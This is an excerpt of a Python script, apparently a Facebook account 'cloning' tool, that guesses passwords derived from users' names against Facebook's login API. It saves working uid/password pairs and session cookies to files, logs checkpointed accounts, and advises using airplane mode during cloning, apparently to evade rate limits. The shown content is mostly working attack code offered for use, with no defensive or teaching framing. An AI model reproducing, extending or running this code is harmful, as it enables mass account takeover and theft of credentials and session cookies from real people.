...
def logo():
 ...
 |_|  |_|\__,_/___|_|
---------------------------------------------------
 ╰◈▪➣ Author    : Muzamil Raees
 ╰◈▪➣ Github    : Muzamil - Raees
...
class Main:
	...
	def password_menu(self,id):
		...
		line()
		p(' [•] Use   ( Airplane  ) Mode Before / During Cloning ')
		line()
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [Muzi] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[Muzi-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/Muzi_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/Muzi_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;97m[Muzi-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/Muzi_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
